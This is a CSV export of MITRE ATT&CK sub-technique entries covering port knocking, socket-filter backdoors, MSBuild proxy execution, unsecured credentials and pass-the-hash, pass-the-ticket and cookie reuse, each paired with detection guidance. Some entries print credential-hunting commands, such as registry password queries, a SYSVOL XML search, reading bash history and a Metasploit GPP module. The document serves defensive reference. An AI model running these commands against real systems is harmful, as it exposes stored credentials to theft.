ID,STIX ID,name,description,url,created,last modified,domain,version,tactics,detection,platforms,data sources,is_sub_technique,parent_technique,defenses bypassed,contributors,permissions required,supports remote,system requirements,impact type,effective permissions,relationship citations
T1205.001,attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd,Traffic Signaling: Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",https://attack.mitre.org/techniques/T1205/001,01 July 2020,11 March 2022,enterprise-attack,1.1,"Command and Control, Defense Evasion, Persistence","Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1205,,,User,,,,,"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: Bitdefender StrongPity June 2020),"
T1205.002,attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520,Traffic Signaling: Socket Filters,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",https://attack.mitre.org/techniques/T1205/002,30 September 2022,20 October 2022,enterprise-attack,1.0,"Command and Control, Defense Evasion, Persistence",Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.(Citation: crowdstrike bpf socket filters),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Process: Process Creation",True,T1205,,CrowdStrike; Tim (Wadhwa-)Brown,,,,,,"(Citation: Leonardo Turla Penquin May 2020),"
T1127.001,attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96,Trusted Developer Utilities Proxy Execution: MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)

Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",https://attack.mitre.org/techniques/T1127/001,27 March 2020,14 August 2023,enterprise-attack,1.3,Defense Evasion,Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1127,,"@ionstorm; Carrie Roberts, @OrOneEqualsOne",,,.NET Framework version 4 or higher,,,"(Citation: Talos Frankenstein June 2019),(Citation: Github PowerShell Empire),(Citation: Palo Alto PlugX June 2017),(Citation: Microsoft WDAC)"
T1552.003,attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3,Unsecured Credentials: Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",https://attack.mitre.org/techniques/T1552/003,04 February 2020,08 March 2022,enterprise-attack,1.1,Credential Access,"Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like ""history"" instead of commands like <code>cat ~/.bash_history</code>.","Linux, macOS","Command: Command Execution, File: File Access",True,T1552,,,User,,,,,"(Citation: Aqua Kinsing April 2020),"
T1552.008,attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3,Unsecured Credentials: Chat Messages,"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.

Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).",https://attack.mitre.org/techniques/T1552/008,14 March 2023,11 April 2023,enterprise-attack,1.0,Credential Access,,"Google Workspace, Office 365, SaaS",Application Log: Application Log Content,True,T1552,,Douglas Weir,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),"
T1552.005,attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3,Unsecured Credentials: Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)

If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.
",https://attack.mitre.org/techniques/T1552/005,11 February 2020,21 March 2023,enterprise-attack,1.4,Credential Access,"Monitor access to the Instance Metadata API and look for anomalous queries.

It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).",IaaS,User Account: User Account Authentication,True,T1552,,Praetorian,,,,,,"(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro TeamTNT),(Citation: Unit 42 Hildegard Malware),(Citation: Peirates GitHub),(Citation: Amazon AWS IMDS V2),(Citation: RedLock Instance Metadata API 2018)"
T1552.007,attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436,Unsecured Credentials: Container API,"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)

An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ",https://attack.mitre.org/techniques/T1552/007,31 March 2021,15 April 2023,enterprise-attack,1.2,Credential Access,"Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.

It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).",Containers,"Command: Command Execution, User Account: User Account Authentication",True,T1552,,"Center for Threat-Informed Defense (CTID); Jay Chen, Palo Alto Networks; Yossi Weizman, Azure Defender Research Team",,,,,,"(Citation: Peirates GitHub),(Citation: Kubernetes API Control Access),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide),(Citation: Microsoft AKS Azure AD 2023),(Citation: Kubernetes RBAC),(Citation: Kubernetes Service Accounts),(Citation: Kubernetes Cloud Native Security)"
T1552.001,attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc,Unsecured Credentials: Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",https://attack.mitre.org/techniques/T1552/001,04 February 2020,23 August 2023,enterprise-attack,1.2,Credential Access,"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.","Containers, IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: Process Creation",True,T1552,,"Jay Chen, Palo Alto Networks; Microsoft Threat Intelligence Center (MSTIC); Rory McCune, Aqua Security; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,Access to files,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Invincea XTunnel),(Citation: Symantec Buckeye),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: AADInternals Documentation),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub LaZagne Dec 2018),(Citation: Talos Smoke Loader July 2018),(Citation: GitHub PoshC2),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Volexity Patchwork June 2018),(Citation: F-Secure BlackEnergy 2014),(Citation: Symantec Leafminer July 2018),(Citation: Cisco Talos Intelligence Group),(Citation: GitHub QuasarRAT),(Citation: Symantec MuddyWater Dec 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Cyberreason Anchor December 2019),(Citation: US-CERT Emotet Jul 2018),(Citation: TrendMicro Trickbot Feb 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Trend Micro TeamTNT),(Citation: Unit 42 Hildegard Malware),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Proofpoint TA505 Sep 2017),(Citation: CrowdStrike Putter Panda),(Citation: Github PowerShell Empire),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT34 July 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: GitHub Pupy),(Citation: CERT-FR PYSA April 2020),(Citation: CIS Emotet Dec 2018),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT35 2018),"
T1552.002,attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580,Unsecured Credentials: Credentials in Registry,"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",https://attack.mitre.org/techniques/T1552/002,04 February 2020,28 July 2023,enterprise-attack,1.1,Credential Access,"Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access",True,T1552,,"Sudhanshu Chauhan, @Sudhanshu_C",,,Ability to query some Registry locations depends on the adversary's level of access. User permissions are usually limited to access of user-related Registry keys.,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Pentestlab Stored Credentials),(Citation: SentinelOne Valak June 2020),(Citation: TrendMicro Trickbot Feb 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),"
T1552.006,attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e,Unsecured Credentials: Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>
",https://attack.mitre.org/techniques/T1552/006,11 February 2020,17 June 2020,enterprise-attack,1.0,Credential Access,"Monitor for attempts to access SYSVOL that involve searching for XML files. 

Deploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)",Windows,"Command: Command Execution, File: File Access",True,T1552,,,User,,,,,"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Mandiant FIN12 Oct 2021),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Symantec Elfin Mar 2019),(Citation: FireEye APT33 Guardrail),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: Microsoft MS14-025),(Citation: MS14-025)"
T1552.004,attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf,Unsecured Credentials: Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 

Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)

When a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)

On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) 

Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",https://attack.mitre.org/techniques/T1552/004,04 February 2020,12 April 2023,enterprise-attack,1.1,Credential Access,"Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported.","Linux, Network, Windows, macOS","Command: Command Execution, File: File Access",True,T1552,,"Austin Clark, @c2defense; Itzik Kotler, SafeBreach",,,,,,"(Citation: Kaspersky Adwind Feb 2016),(Citation: FoxIT Wocao December 2019),(Citation: Aqua Kinsing April 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ESET Machete July 2019),(Citation: Trend Micro TeamTNT),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: AADInternals Documentation),(Citation: Microsoft 365 Defender Solorigate),(Citation: Adsecurity Mimikatz Guide),(Citation: Unit 42 Hildegard Malware),(Citation: MSTIC FoggyWeb September 2021),(Citation: Anomali Rocke March 2019),(Citation: Github PowerShell Empire),(Citation: ESET Ebury Feb 2014),(Citation: cisco_deploy_rsa_keys),(Citation: Microsoft Primary Refresh Token)"
T1550.001,attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51,Use Alternate Authentication Material: Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) 

OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)

Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",https://attack.mitre.org/techniques/T1550/001,30 January 2020,19 September 2023,enterprise-attack,1.5,"Defense Evasion, Lateral Movement","Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.(Citation: AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)","Azure AD, Containers, Google Workspace, IaaS, Office 365, SaaS",Web Credential: Web Credential Usage,True,T1550,System Access Controls,"Dylan Silva, AWS Security; Ian Davila, Tidal Cyber; Jack Burns, HubSpot; Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Mark Wee; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)",,,,,,"(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Peirates GitHub),(Citation: Microsoft Azure AD Admin Consent)"
T1550.002,attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e,Use Alternate Authentication Material: Pass the Hash,"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",https://attack.mitre.org/techniques/T1550/002,30 January 2020,28 July 2023,enterprise-attack,1.2,"Defense Evasion, Lateral Movement","Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.

Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1550,System Access Controls,"Blake Strom, Microsoft 365 Defender; Travis Smith, Tripwire",,,,,,"(Citation: Cybereason Cobalt Kitty 2017),(Citation: CME Github September 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft SIR Vol 19),(Citation: Mandiant FIN13 Aug 2022),(Citation: Mandiant APT1),(Citation: CISA AA20-301A Kimsuky),(Citation: BitDefender BADHATCH Mar 2021),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Adsecurity Mimikatz Guide),(Citation: NCSC Joint Report Public Tools),(Citation: McAfee Night Dragon),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: NSA Spotting),(Citation: GitHub IAD Secure Host Baseline UAC Filtering)"
T1550.003,attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926,Use Alternate Authentication Material: Pass the Ticket,"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",https://attack.mitre.org/techniques/T1550/003,30 January 2020,30 March 2023,enterprise-attack,1.1,"Defense Evasion, Lateral Movement","Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.

Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to ""Integrity check on decrypted field failed"" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1550,System Access Controls,Ryan Becwar; Vincent Le Toux,,,Kerberos authentication enabled,,,"(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Mandiant No Easy Breach),(Citation: Harmj0y DCSync Sept 2015),(Citation: Symantec Seaduke 2015),(Citation: Adsecurity Mimikatz Guide),(Citation: GitHub Pupy),(Citation: NCSC Joint Report Public Tools),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: STIG krbtgt reset),(Citation: ADSecurity Kerberos and KRBTGT),(Citation: ADSecurity AD Kerberos Attacks)"
T1550.004,attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0,Use Alternate Authentication Material: Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",https://attack.mitre.org/techniques/T1550/004,30 January 2020,19 September 2023,enterprise-attack,1.3,"Defense Evasion, Lateral Movement",Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.,"Google Workspace, IaaS, Office 365, SaaS","Application Log: Application Log Content, Web Credential: Web Credential Usage",True,T1550,System Access Controls,"Jack Burns, HubSpot; Johann Rehberger",,,,,,"(Citation: Volexity SolarWinds),(Citation: CrowdStrike StellarParticle January 2022),"
